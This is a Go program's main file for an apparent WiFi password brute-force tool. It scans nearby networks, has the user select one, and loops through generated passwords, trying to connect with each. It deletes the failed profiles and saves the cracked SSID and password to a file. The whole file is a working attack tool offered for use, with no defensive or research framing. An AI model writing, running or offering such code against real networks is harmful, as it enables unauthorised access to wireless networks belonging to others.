package main

import (
	"fmt"
	"log"
	"time"
	"wifi/pkg/config"
	"wifi/pkg/pwd"
	"wifi/pkg/setting"
	"wifi/pkg/util"
	"wifi/pkg/wifi"
)

func main() {
	var start = time.Now()

	// get wifi list
	networks, err := wifi.GetWIFINetworks()
	if err != nil {
		fmt.Println("Get WIFI Networks:", err)
		return
	}

	// print wifi list
	fmt.Println("WiFi list:")
	for i, n := range networks {
		fmt.Printf("index: %d, Signal: %d, BSSID: %s, SSID: %s\n", i, n.Signal, n.BSSID, n.SSID)
	}

	// choose wifi
	fmt.Print("Choose WiFi index: ")
	var selected int
	fmt.Scanln(&selected)
	if selected < 0 || selected >= len(networks) {
		fmt.Println("Invalid selection")
		return
	}
	selection := networks[selected]
	fmt.Println("Your choice:", selection.SSID)

	// create password producer
	pwdChan := pwd.NewProducer(
		config.PwdMinLen,
		config.PwdMaxLen,
		config.PwdCharDict,
	)

	var couter int
	for pwd := range pwdChan {
		var now = time.Now()
		couter++
		fmt.Println("-------------------------- Attempts:", couter, "--------------------------")

		log.Println("Trying password: ", pwd)
		wc := wifi.New(selection.SSID, pwd)

		stat, err := wc.Connect()
		if err != nil {
			log.Println("Connect WiFi failed:", err)
			return
		}
		if stat == wifi.Connected {
			log.Println("Connect WiFi success:", selection.SSID, pwd)
			err = util.WriteToFile(setting.SuccessPwdSavePath, fmt.Sprintf("WiFi: %s, password: %s\n", wc.Ssid, pwd))
			if err != nil {
				log.Println("write password to file err", err)
			}
			return
		}
		log.Println("Connect WiFi failed")
		err = wc.DeleteProfile()
		if err != nil {
			log.Println("Delete profile failed:", err)
			return
		}
		log.Println("Delete profile success")
		log.Printf("Total spent: %s, current spent: %s",
			time.Since(start).Truncate(time.Second).String(),
			time.Since(now).Truncate(time.Second).String(),
		)
	}
}
